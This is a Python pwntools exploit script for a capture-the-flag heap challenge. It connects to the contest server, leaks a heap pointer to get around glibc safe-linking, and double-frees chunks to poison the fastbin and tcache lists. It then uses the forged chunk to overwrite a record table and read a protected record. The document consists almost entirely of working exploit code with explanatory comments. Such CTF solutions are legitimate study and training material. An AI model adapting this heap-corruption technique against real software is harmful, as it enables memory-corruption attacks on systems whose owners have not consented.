from pwn import *

path = "./k511.elf"
#p = gdb.debug(path)
#p = process(path)
p = remote("k511.challs.srdnlen.it", 1660)

target = p64(0x4040404040404040) #Pointers have to be 8-aligned ('8' is 0x38) and distinguishable in terms of bin size. We will need to offset it with a xor, more details later.
# Our attack will overwrite the Record table, placing an offset to the first record in a record after 0, allowing us to read it. 
# We must do this because our direct allocations always overwrite the content otherwise.
record_page_offset = 0x2a0
first_record_offset = 0x330


def alloc_b(data = target):
    print(f"Allocating {data}")
    p.sendline(b'1')
    p.recvuntil(b'chars')
    p.sendline(data)
    return p.recvuntil(b'1) C')

def recall_b(block):
    p.sendline(b'2')
    p.recvuntil(b'require')
    p.sendline(block)
    p.recvuntil(b'\t"')
    return p.recvuntil(b'1) C')[:-5]

def erase_b(block):
    print(f"Erasing {block}")
    p.sendline(b'3')
    p.recvuntil(b'require')
    p.sendline(block)
    return p.recvuntil(b'1) C')

#p.interactive()

for _ in range(16):
    alloc_b() # Alloc chunks to fill tcache

# We need this heap leak to get past a xor-based countermeasure.
def heap_leak():
    for i in range(13,16):
        erase_b(f"{i}")
    alloc_b()
    res = recall_b('14')
    #Refill slots, erase any free chunks
    print(res)
    for _ in range(4):
        alloc_b()
    return res


offset_str = heap_leak() + b'\0\0'
self_xor_correct = u64(offset_str) ^ (u64(offset_str)>>12) ^ (u64(offset_str)>>24) 
heap_page_offset = self_xor_correct & 0xfffffffffffff000
print("////////CHECK HEAP PAGE LEAK")
print(hex(heap_page_offset))

# Update the target to the real value, and apply the strange fastbin-to-tcache offset xoring. Requires heap ptr.
target = heap_page_offset + record_page_offset + 16 #Overwrite record #3 with value of first record
print(f"Records location: {target-16}")
target = p64(target ^ (heap_page_offset>>12)) 

#payload is the first record offset somewhere.
payload = p64(heap_page_offset + first_record_offset) #end up at offset 2
print(f"Record #1 location: {heap_page_offset + first_record_offset}")

for i in range(2,9): # 7 frees
    erase_b(f"{i}")

#Create fastbin-to-tcache reverse-free

erase_b('10')
for _ in range(3):
    erase_b('11')
    erase_b('12')

for _ in range(7):
    alloc_b(target)

alloc_b(target)
alloc_b(target)
alloc_b(target) #fake chunkptr target to ex-fastbin is on top now

alloc_b(payload) # Write record #1 pointer in record #3's place

print(recall_b('2'))